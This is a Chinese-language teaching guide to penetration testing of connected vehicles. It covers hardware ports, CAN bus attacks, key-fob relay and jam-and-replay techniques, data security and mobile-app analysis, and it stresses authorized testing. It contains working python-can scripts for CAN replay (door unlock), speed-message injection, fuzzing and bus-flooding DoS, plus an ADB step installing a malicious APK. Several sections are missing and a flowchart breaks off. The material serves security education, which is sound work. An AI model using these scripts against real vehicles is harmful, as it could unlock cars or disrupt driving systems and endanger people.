## 一、车联网渗透测试方法论

### 1.1 渗透测试原则

#### 1.1.1 合法性原则

- **必须获得授权**：在进行任何测试前，必须获得车辆所有者或制造商的书面授权
- **遵守法律法规**：遵守《网络安全法》《数据安全法》《个人信息保护法》等相关法规
- **不影响公共安全**：测试过程中不得影响道路交通安全和公共安全
- **报告义务**：发现高危漏洞应及时报告厂商，不公开未修复的漏洞

#### 1.1.2 安全原则

- **安全第一**：人的安全始终是第一位的
- **可控环境**：优先在实验环境、台架、报废车辆上测试
- **影响最小化**：尽可能减少对车辆和系统的影响
- **可恢复性**：确保测试后系统能恢复到正常状态

### 1.2 渗透测试流程

```
┌─────────────┐
│  1. 授权与规划 │ ← 确定范围、目标、时间、约束

```

### 1.3 测试范围与分类

#### 1.3.1 按测试对象分类

| 测试对象 | 测试内容 | 难度 |
|---------|---------|------|
| 车载系统 | IVI、智能座舱、仪表盘 | 中 |
| 车载网络 | CAN/CAN FD/LIN/以太网 | 中高 |
| T-Box | 固件、通信、远程控制 | 高 |
| OBD/诊断 | UDS诊断、刷写、安全访问 | 中高 |
| 无线攻击 | 蓝牙、Wi-Fi、车钥匙、NFC | 中高 |
| 移动App | 安卓/iOS App、数据安全 | 中 |
| 云平台 | API安全、数据安全、权限控制 | 中 |
| 自动驾驶 | 传感器、算法、决策系统 | 很高 |

#### 1.3.2 按攻击距离分类

```
远程攻击（远）
    │
    ├── 4G/5G 蜂窝网络 → T-Box、车云通信
    ├── V2X 通信 → 车车/车路通信
    ├── 云平台 API → 远程服务
    └── 移动 App → 远程控制

近场攻击（中）
    │
    ├── 蓝牙 → 手机互联、车钥匙
    ├── Wi-Fi → 车内热点、车机互联

物理攻击（近）
    │
    ├── OBD-II 接口 → 诊断、CAN接入
    ├── USB 接口 → 车机系统
    ├── 拆解 → 芯片读取、调试接口
    ├── JTAG/SWD → 硬件调试
    └── 传感器 → 物理攻击
```

### 1.4 风险评级方法

参考CVSS评分体系，结合车联网特点：

| 维度 | 评估因素 | 说明 |
|------|---------|------|
| 攻击向量 | 远程/近场/物理 | 攻击距离越远，风险越高 |
| 攻击复杂度 | 低/中/高 | 需要的专业知识和资源 |
| 权限要求 | 无/低/高 | 攻击前需要的权限 |
| 用户交互 | 无需/需要 | 是否需要用户配合 |
| 安全影响 | 驾驶安全/财产/隐私 | 对人身安全的影响权重最高 |
| 影响范围 | 单台车/批量 | 影响车辆数量 |

**车联网安全特别关注：** 对驾驶安全的影响是最重要的评级因素。

## 二、硬件攻击

### 2.1 硬件攻击概述

硬件攻击是车联网渗透测试的重要组成部分，通过物理接触获取系统访问权限或提取敏感信息。

**常见硬件攻击目标：**
- OBD-II接口
- USB接口
- ECU芯片
- T-Box
- IVI系统
- 调试接口

### 2.2 OBD-II接口攻击

#### 2.2.1 接口探测

**步骤：**
1. 找到OBD-II接口位置（通常在驾驶位下方）
2. 使用万用表测量针脚电压，确定CAN_H（6脚）和CAN_L（14脚）
3. 连接CAN适配器，监听总线流量

**工具：**
- USB-CAN适配器（PCAN、USB2CAN、CANable等）
- 万用表
- OBD公头转接线

#### 2.2.2 总线嗅探

```bash
# Linux下使用can-utils
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up
candump can0
```

**分析内容：**
- 识别总线上活跃的CAN ID
- 记录各ID的发送周期
- 分析数据变化规律
- 识别诊断报文（ID: 0x7xx）

#### 2.2.3 诊断功能探测

**方法：** 发送UDS诊断请求，探测支持的服务。

```
# 探测0x7DF（功能寻址）
发送: 02 10 01 00 00 00 00 00  (默认会话)
响应: 各ECU的响应（0x7E8, 0x7E9等）

# 读取DTC
发送: 03 19 02 0B 00 00 00 00  (读取当前DTC)
```

### 2.3 USB接口攻击

#### 2.3.1 攻击面

- **USB调试模式**：Android车机可能开启ADB调试
- **USB存储**：通过U盘传播恶意软件
- **USB配件模式**：Android Auto / CarPlay 接口
- **固件更新**：通过USB进行固件升级

#### 2.3.2 ADB调试攻击

**条件：** IVI系统开启了USB调试

```bash
# 连接后检查设备
adb devices

# 获取Shell
adb shell

# 查看系统信息
adb shell getprop

# 安装应用
adb install malicious.apk
```

#### 2.3.3 BadUSB攻击

**原理：** 使用可编程USB设备（如Rubber Ducky、BadUSB）模拟键盘输入，自动执行攻击命令。

**攻击场景：**
- 车机系统可通过USB键盘操作
- 自动打开开发者选项
- 自动安装恶意应用

### 2.4 芯片拆解与读取

#### 2.4.1 芯片类型

| 芯片类型 | 用途 | 读取难度 |
|---------|------|---------|
| SPI Flash | 存储固件、配置 | 低 |
| I2C EEPROM | 存储数据、密钥 | 低 |
| MCU内部Flash | 主程序存储 | 中高（可能有读保护） |
| eMMC | 大容量存储（IVI） | 中 |
| NOR Flash | 启动代码存储 | 中 |

#### 2.4.2 芯片读取步骤

```
① 查找芯片
   ↓ 使用芯片丝印信息查找型号和数据手册
② 确认引脚定义
   ↓ 根据数据手册确定引脚（VCC、GND、CLK、DIO等）
③ 连接编程器
   ↓ 使用飞线或测试夹连接编程器
④ 读取固件
   ↓ 使用编程软件读取芯片内容
⑤ 验证完整性
   ↓ 校验和、多次读取比对
```

#### 2.4.3 常用工具

| 工具 | 支持芯片 | 说明 |
|------|---------|------|
| CH341A编程器 | SPI Flash、I2C EEPROM | 廉价，入门首选 |
| TL866II+ | 多种Flash、MCU | 支持芯片多 |
| J-Link | ARM MCU调试 | JTAG/SWD调试 |
| ST-Link | STM32调试 | STM32专用 |
| 逻辑分析仪 | 各种数字信号 | 分析通信协议 |
| 示波器 | 模拟/数字信号 | 信号级分析 |

#### 2.4.4 Flash读保护绕过

很多MCU有读保护（Read Protection）机制，常见的绕过方法：

1. **故障注入攻击（Glitching）**：通过电压或时钟故障使保护机制失效
2. **调试接口利用**：利用调试接口的漏洞
3. **固件更新漏洞**：通过官方更新通道提取固件
4. **物理攻击**：芯片开盖、微探针

### 2.5 调试接口攻击

#### 2.5.1 常见调试接口

| 接口 | 特点 | 识别方法 |
|------|------|---------|
| UART | 串行调试口，最常见 | 找测试点：TX、RX、VCC、GND |
| JTAG | 边界扫描，功能强大 | 找测试点：TCK、TMS、TDI、TDO |
| SWD | ARM调试接口，简化版JTAG | 找测试点：SWDIO、SWCLK |
| SWIM | STM8调试接口 | 找测试点：SWIM |

#### 2.5.2 UART调试口发现

**方法：**
1. 观察PCB上的测试点（Test Point）
2. 查找丝印标识（TX、RX、UART、TXD、RXD等）
3. 用万用表找VCC和GND
4. 用逻辑分析仪观察各测试点的信号
5. 尝试不同波特率连接

**典型波特率：** 9600、19200、38400、57600、115200、921600

**连接工具：** USB转TTL模块（CH340、CP2102、PL2303等）

#### 2.5.3 JTAG/SWD调试

**JTAG接口引脚：**
- TCK（Test Clock）：测试时钟
- TMS（Test Mode Select）：测试模式选择
- TDI（Test Data In）：测试数据输入
- TDO（Test Data Out）：测试数据输出
- TRST（Test Reset）：测试复位（可选）
- GND：地
- VCC：电源

**JTAG调试能力：**
- 读取/修改CPU寄存器
- 读取/修改内存
- 单步执行代码
- 设置断点
- 读取Flash内容
- 烧写固件

### 2.6 硬件攻击防护建议

1. **物理防护**：关键ECU采用防拆设计
2. **调试接口**：量产时禁用调试接口
3. **芯片保护**：启用Flash读保护
4. **固件加密**：Flash中的固件加密存储
5. **安全启动**：验证固件签名后才执行
6. **OBD防护**：增加诊断网关和认证机制

## 三、CAN总线攻击

### 3.1 CAN攻击环境准备

**硬件：**
- USB-CAN适配器（推荐PCAN-USB或CANable）
- OBD-II转接线
- 汽车ECU或开发板（目标设备）

**软件：**
- can-utils（Linux）
- CANoe / CANalyzer（Windows，商业软件）
- Wireshark + CAN插件
- Python + python-can库
- 自定义脚本

### 3.2 CAN嗅探与分析

#### 3.2.1 基础嗅探

```python
# 使用python-can进行CAN总线监听
import can

# 创建CAN总线实例
bus = can.interface.Bus(channel='can0', interface='socketcan')

# 持续接收并打印报文
print("开始监听CAN总线...")
try:
    for msg in bus:
        # 格式化输出：时间戳 ID 数据
        data_str = ' '.join(f'{b:02X}' for b in msg.data)
        print(f"{msg.timestamp:10.6f}  ID={msg.arbitration_id:03X}  "
              f"{'RX' if msg.is_rx else 'TX'}  DLC={msg.dlc}  "
              f"Data: {data_str}")
except KeyboardInterrupt:
    print("\n停止监听")
finally:
    bus.shutdown()
```

#### 3.2.2 报文统计与分析

```python
# CAN报文统计分析
import can
from collections import defaultdict
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

id_stats = defaultdict(lambda: {'count': 0, 'last_time': 0, 'periods': []})
start_time = time.time()

print("进行10秒报文统计...")
try:
    for msg in bus:
        elapsed = time.time() - start_time
        if elapsed > 10:
            break

        stats = id_stats[msg.arbitration_id]
        stats['count'] += 1

        if stats['last_time'] > 0:
            period = (msg.timestamp - stats['last_time']) * 1000  # ms
            stats['periods'].append(period)

        stats['last_time'] = msg.timestamp

except KeyboardInterrupt:
    pass

# 输出统计结果
print(f"\n{'ID':>4}  {'出现次数':>6}  {'平均周期(ms)':>10}  {'速率(帧/秒)':>8}")
print("-" * 50)
for can_id in sorted(id_stats.keys()):
    stats = id_stats[can_id]
    rate = stats['count'] / 10
    avg_period = sum(stats['periods']) / len(stats['periods']) if stats['periods'] else 0
    print(f"{can_id:03X}  {stats['count']:>6}  {avg_period:>10.2f}  {rate:>8.1f}")
```

### 3.3 CAN重放攻击

#### 3.3.1 攻击原理

先录制正常的CAN报文序列，在适当的时候重新发送，达到控制车辆的目的。

#### 3.3.2 攻击步骤

```
① 录制阶段
   ├── 连接CAN适配器到目标总线
   ├── 触发目标动作（如按解锁键）
   ├── 录制相关的CAN报文序列
   └── 分析识别关键控制报文

② 重放阶段
   ├── 选择合适时机（如车辆锁定状态）
   ├── 发送录制的控制报文
   └── 观察是否达到预期效果
```

#### 3.3.3 示例代码

```python
# CAN重放攻击演示
import can
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

# 录制的"解锁车门"报文序列（示例）
unlock_frames = [
    # (延时秒数, CAN ID, 数据字节)
    (0.0, 0x300, [0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    (0.01, 0x301, [0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    (0.05, 0x300, [0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
]

print("执行重放攻击：解锁车门")
for delay, can_id, data in unlock_frames:
    time.sleep(delay)
    msg = can.Message(
        arbitration_id=can_id,
        data=data,
        is_extended_id=False
    )
    bus.send(msg)
    print(f"  发送: ID={can_id:03X} Data={' '.join(f'{b:02X}' for b in data)}")

print("重放完成")
bus.shutdown()
```

### 3.4 CAN注入攻击

#### 3.4.1 攻击原理

攻击者构造并发送伪造的CAN报文，欺骗ECU执行相应动作。

#### 3.4.2 与重放攻击的区别

- **重放攻击**：发送之前录制的真实报文，数据完全合法
- **注入攻击**：构造并发送伪造的报文，数据由攻击者生成

#### 3.4.3 常见注入目标

| 目标功能 | 典型CAN ID | 攻击效果 |
|---------|-----------|---------|
| 车速 | 0x200~0x2FF | 虚假车速，影响仪表显示 |
| 发动机转速 | 0x100~0x1FF | 虚假转速 |
| 车门控制 | 0x300~0x3FF | 解锁/上锁车门 |
| 刹车控制 | 0x200~0x2FF | 控制刹车系统 |
| 灯光控制 | 0x400~0x4FF | 控制车灯 |
| 仪表盘 | 0x500~0x5FF | 控制仪表显示 |

#### 3.4.4 注入攻击示例

```python
# CAN注入攻击：伪造车速报文
import can
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

print("执行注入攻击：伪造车速为120km/h")
print("按Ctrl+C停止")

# 假设车速报文ID为0x200
# 车速 = (Byte0 << 8 | Byte1) / 10  km/h
# 120km/h = 1200 = 0x04B0
speed = 120  # km/h
speed_raw = int(speed * 10)  # 原始值
speed_high = (speed_raw >> 8) & 0xFF
speed_low = speed_raw & 0xFF

try:
    while True:
        msg = can.Message(
            arbitration_id=0x200,
            data=[speed_high, speed_low, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
            is_extended_id=False
        )
        bus.send(msg)
        time.sleep(0.01)  # 10ms周期，模拟真实发送频率
except KeyboardInterrupt:
    print("\n停止注入")
finally:
    bus.shutdown()
```

### 3.5 CAN模糊测试

#### 3.5.1 模糊测试目的

- 发现ECU软件漏洞（缓冲区溢出、空指针等）
- 测试ECU的健壮性
- 发现未定义行为

#### 3.5.2 模糊测试方法

**随机Fuzz：**
```python
import can
import random
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

print("随机模糊测试中...")
try:
    for _ in range(1000):
        # 随机ID和数据
        can_id = random.randint(0x000, 0x7FF)
        dlc = random.randint(0, 8)
        data = [random.randint(0, 255) for _ in range(dlc)]

        msg = can.Message(
            arbitration_id=can_id,
            data=data,
            is_extended_id=False
        )
        bus.send(msg)
        time.sleep(0.001)
except KeyboardInterrupt:
    pass
finally:
    bus.shutdown()
```

**变异Fuzz（基于正常报文）：**
```python
# 在已知正常报文基础上进行变异
import can
import random
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

# 正常报文模板
base_msgs = [
    (0x100, [0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0]),
    (0x200, [0x00, 0xFA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
    (0x300, [0x01, 0x02, 0x03, 0x04, 0x00, 0x00, 0x00, 0x00]),
]

def mutate_data(data, mutation_rate=0.1):
    """对数据进行变异"""
    mutated = list(data)
    for i in range(len(mutated)):
        if random.random() < mutation_rate:
            mutated[i] = random.randint(0, 255)
    return mutated

print("变异模糊测试中...")
try:
    while True:
        can_id, data = random.choice(base_msgs)
        mutated_data = mutate_data(data, mutation_rate=0.2)

        msg = can.Message(
            arbitration_id=can_id,
            data=mutated_data,
            is_extended_id=False
        )
        bus.send(msg)
        time.sleep(0.005)
except KeyboardInterrupt:
    pass
finally:
    bus.shutdown()
```

### 3.6 CAN拒绝服务攻击

#### 3.6.1 总线洪泛攻击

```python
# CAN总线洪泛DoS攻击
import can
import time

bus = can.interface.Bus(channel='vcan0', interface='socketcan')

print("执行CAN总线洪泛攻击（持续5秒）...")
print("使用高优先级ID 0x000独占总线")

start_time = time.time()
count = 0
while time.time() - start_time < 5:
    msg = can.Message(
        arbitration_id=0x000,  # 最高优先级ID
        data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
        is_extended_id=False
    )
    try:
        bus.send(msg)
        count += 1
    except can.CanError:
        pass

print(f"攻击完成，共发送 {count} 帧")
bus.shutdown()
```

### 4.3 车钥匙攻击

#### 4.3.1 钥匙系统类型

| 类型 | 原理 | 安全性 |
|------|------|--------|
| 传统机械钥匙 | 物理匹配 | 低 |
| 遥控钥匙（RKE） | 315/433MHz射频 | 中 |
| 智能钥匙（PKE） | 低频+射频，被动进入 | 中高 |
| 数字钥匙 | 蓝牙/NFC/UWB | 高 |

#### 4.3.2 中继攻击（Relay Attack）

**原理：** 使用两个中继设备，将车钥匙的信号转发到车辆附近，欺骗车辆认为钥匙就在附近。

```
车主（钥匙在口袋里）           中继设备A          中继设备B           车辆
     │                           │                   │                │
     │<── 钥匙低频信号 ──────────│                   │                │
     │                           │                   │                │
     │  ─── 信号转发 ──────────→ │ ─── 转发 ──────→ │ ── 信号 ──→   │
     │                           │                   │                │
     │  ←── 钥匙响应 ──────────  │ ←── 转发 ─────── │ ←── 响应 ──   │
     │                           │                   │                │
```

**防御措施：**
- 运动检测（钥匙静止时降低发射功率）
- UWB精确定位（测量距离，防止中继）
- 时间戳校验（信号飞行时间）

#### 4.3.3 重放攻击（Rolling Code绕过）

**原理：** 遥控钥匙使用滚动码（Rolling Code），每次发送的代码都不同。攻击者可以在信号覆盖范围外干扰车辆接收，同时录制钥匙信号，下次使用。

**攻击步骤（Jamming + Replay）：**
```
① 攻击者在车辆附近放置干扰器
② 车主按钥匙解锁
③ 干扰器阻止车辆接收，但攻击者录制了遥控信号
④ 车主再次按钥匙（车辆仍未收到），攻击者录制第二帧
⑤ 攻击者使用第一帧解锁车辆（第二帧留着下次用）
```

#### 4.4.1 攻击面

#### 7.5.1 敏感数据类型

- **个人信息**：姓名、手机号、身份证号
- **车辆数据**：VIN码、车牌、车辆配置
- **位置数据**：实时位置、行驶轨迹
- **驾驶行为**：车速、加速度、驾驶习惯
- **车内数据**：语音录音、摄像头画面
- **支付数据**：支付账号、交易记录

#### 7.5.2 测试要点

- 数据传输是否加密
- 数据存储是否加密
- 是否存在数据泄露接口
- 数据脱敏是否到位
- 日志中是否包含敏感数据
- 是否符合数据安全法规要求

## 八、APP关联分析

### 8.1 移动APP安全测试

#### 8.1.1 测试范围

- **车主APP**：远程控制、车辆状态、服务预约
- **经销商APP**：车辆管理、售后服务
- **共享汽车APP**：租车、还车、支付
- **车载APP**：车机端应用

#### 8.1.2 常见安全问题

| 问题 | 说明 |
|------|------|
| 反编译风险 | 代码未混淆，容易逆向 |
| 敏感信息泄露 | 密码、密钥硬编码在APK中 |
| 调试信息残留 | 开发调试代码未移除 |
| 数据存储不安全 | 敏感数据明文存储 |
| 通信安全问题 | 不验证证书、明文传输 |
| 组件导出风险 | Activity/Service/Broadcast导出 |
| WebView漏洞 | JavaScript接口漏洞 |
| Root检测绕过 | 可绕过Root检测 |

#### 8.1.3 APK分析流程

```
APK文件
    ↓
① 反编译
    ├── apktool → 资源文件、Smali代码
    ├── jadx → Java源代码
    └── dex2jar → jar文件
    ↓
② 静态分析
    ├── AndroidManifest.xml分析（组件、权限）
    ├── 敏感信息搜索（密钥、URL、密码）
    ├── 代码审计（业务逻辑漏洞）
    ├── 加密算法分析
    └── 第三方SDK分析
    ↓
③ 动态分析
    ├── Frida Hook（关键函数）
    ├── 网络抓包（API接口分析）
    ├── 数据存储检查
    └── 运行时行为分析
```

### 8.2 APP与车辆关联安全

#### 8.2.1 账号与车辆绑定

**测试要点：**
- 绑定流程是否需要验证车主身份
- 是否可绑定他人车辆
- 解绑是否需要验证
- 多用户控制同一辆车的权限隔离

#### 8.2.2 远程控制安全

**测试要点：**
- 控制指令是否需要二次验证（PIN、指纹）
- 是否有操作频率限制
- 是否有地理围栏限制
- 控制指令是否可重放
- 控制日志是否完整

### 8.3 第三方SDK安全

车联网APP常集成以下SDK：
- 地图SDK（高德、百度、腾讯）
- 支付SDK（支付宝、微信支付）
- 推送SDK（极光、个推）
- 统计SDK（友盟、TalkingData）
- 语音SDK（科大讯飞、百度语音）

**安全风险：**
- SDK自身存在漏洞
- SDK过度申请权限
- SDK收集过多用户数据
- SDK更新不及时

## 十、学习要点与思考题

### 10.1 核心知识点总结

1. **方法论**：合法授权、安全第一、信息收集→威胁建模→漏洞挖掘→验证→报告
2. **硬件攻击**：OBD接口、USB接口、芯片读取、调试接口（UART/JTAG）
3. **CAN攻击**：嗅探、重放、注入、DoS、模糊测试，各有不同的检测和防御方法
4. **无线攻击**：蓝牙、Wi-Fi、车钥匙（中继攻击）、4G/5G、V2X
5. **车机攻击**：Android车机（ADB、应用漏洞、提权）、QNX系统
6. **T-Box测试**：硬件拆解、固件分析、通信安全、远程控制
7. **云平台安全**：API安全、设备认证、OTA安全、数据安全
8. **APP安全**：静态分析、动态分析、关联安全、SDK安全

### 10.2 思考题

1. 为什么物理攻击在车联网安全中占有重要地位？物理攻击的门槛真的很高吗？
2. CAN总线重放攻击和注入攻击哪个危害更大？为什么？
3. 中继攻击为什么能破解智能钥匙？UWB为什么能防御中继攻击？
4. T-Box为什么是车联网安全的"兵家必争之地"？攻破T-Box能做什么？
5. 车联网云平台和传统互联网平台的安全测试有什么不同？
